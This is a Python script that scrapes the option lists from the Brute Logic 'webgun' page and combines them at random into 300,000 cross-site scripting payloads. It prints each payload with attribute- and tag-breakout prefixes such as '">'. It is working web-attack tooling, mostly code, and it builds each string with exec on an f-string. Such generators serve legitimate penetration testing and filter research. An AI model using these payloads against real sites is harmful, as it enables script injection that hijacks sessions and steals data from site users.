#!/usr/bin/env python

import os
import sys
import json
import pathlib
import requests
import time
import random
import itertools
from functools import partial
from pprint import pprint
from pyquery import PyQuery as pq


p = pathlib.Path('webgun.html')
if not p.exists():
    url = 'https://brutelogic.com.br/webgun/'
    r = requests.get(url)
    p.write_text(r.text)
pageq = pq(p.read_text())

def get_options(name, remove_empty=False):
    options = pageq(f'select[name={name}]')
    options = pq(options)('option')
    options = list(options.map(lambda i,e:pq(e).attr('value')))
    if remove_empty:
        options = list(filter(lambda x:not x=='', options))
    return options

extra1s = get_options('extra1')
tags = get_options('tag', remove_empty=True)
s1s = get_options('s1')
extra2s = get_options('extra2')
s2s = get_options('s2')
handlers = get_options('handler', remove_empty=True)
s3s = get_options('s3')
s4s = get_options('s4')
jss = get_options('js', remove_empty=True)
s5s = get_options('s5')
extra3s = get_options('extra3')

payload_format = '{extra1}<{tag}{s1}{extra2}{s2}{handler}{s3}={s4}{js}{s5}>{extra3}'

lists = (extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s)
for i in range(300000):
    extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 = list(map(random.choice, lists))
    if (not s1):
        s1 = ' '
    if extra2 and (not s2):
        s2 = ' '
    s = f'payload=f\'{payload_format}\''
    exec(s, globals(), locals())
    for prefix in ['', '">', "'>", '>']:
        prefix_payload = prefix+payload
        print(prefix_payload)

#generate all payloads, but this take too much time and disk space
#for extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 in itertools.product(extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s):
#    if (not s1):
#        s1 = ' '
#    if extra2 and (not s2):
#        s2 = ' '
#    s = f'payload=f\'{payload_format}\''
#    exec(s, globals(), locals())
#    for prefix in ['', '">', "'>", '>']:
#        prefix_payload = prefix+payload
#        print(prefix_payload)
